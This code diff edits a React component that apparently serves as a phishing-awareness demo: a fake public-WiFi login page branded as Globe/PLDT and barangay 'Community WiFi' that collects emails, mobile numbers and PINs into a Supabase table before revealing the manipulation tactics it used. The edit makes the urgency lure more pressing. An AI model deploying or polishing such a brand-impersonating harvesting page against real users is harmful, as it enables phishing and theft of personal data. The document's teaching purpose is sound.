@@ -13,13 +13,13 @@ const TRIGGERS = [
   { label: 'Authority', color: 'bg-blue-100 text-blue-700', desc: 'Globe/PLDT + Barangay branding implies official government/ISP backing' },
   { label: 'Trust', color: 'bg-green-100 text-green-700', desc: 'Familiar telecom logos and "Community WiFi Program" language build credibility' },
   { label: 'Reward', color: 'bg-yellow-100 text-yellow-700', desc: '"FREE 1-hour session" incentivizes immediate action without questioning' },
-  { label: 'Urgency', color: 'bg-orange-100 text-orange-700', desc: '"You\'ll need this PIN to reconnect" nudges the victim to comply quickly' },
+  { label: 'Urgency', color: 'bg-orange-100 text-orange-700', desc: '"Session expires in 60 minutes. Save this PIN — you will be locked out without it." creates time pressure' },
   { label: 'Normalcy', color: 'bg-purple-100 text-purple-700', desc: 'Captive portals are normal on public WiFi, lowering the victim\'s guard' },
 ]
 
 export default function Portal() {
   const [form, setForm] = useState({ email: '', mobile: '', pin: '' })
-  const [status, setStatus] = useState('idle') // idle | loading | success | revealed
+  const [status, setStatus] = useState('idle')
   const [showTriggers, setShowTriggers] = useState(false)
 
   function handleChange(e) {
@@ -30,7 +30,6 @@ export default function Portal() {
     e.preventDefault()
     setStatus('loading')
 
-    // Save to Supabase — visible from ANY device on the admin panel
     await supabase.from('entries').insert({
       email: form.email,
       mobile: form.mobile,
@@ -42,7 +41,6 @@ export default function Portal() {
     setTimeout(() => setStatus('revealed'), 4500)
   }
 
-  // ── PHASE III: REVEAL SCREEN ──
   if (status === 'revealed') {
     return (
       <div className="min-h-screen bg-amber-50 flex flex-col">
@@ -144,7 +142,6 @@ export default function Portal() {
     )
   }
 
-  // ── PORTAL (victim view) ──
   return (
     <div className="min-h-screen bg-[#eef2f7] flex flex-col">
       <header className="bg-gradient-to-r from-[#003087] via-[#0057b8] to-[#00a651] px-5 py-3 flex items-center justify-between shadow-md">
@@ -204,7 +201,7 @@ export default function Portal() {
                   className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 bg-gray-50 outline-none focus:border-[#0057b8] focus:bg-white transition placeholder-gray-400"
                 />
                 <p className="text-[11px] text-gray-400 mt-1.5">
-                  You will need this PIN to reconnect when your session expires.
+                  Session expires in 60 minutes. Save this PIN — you will be locked out without it.
                 </p>
               </div>
               <button
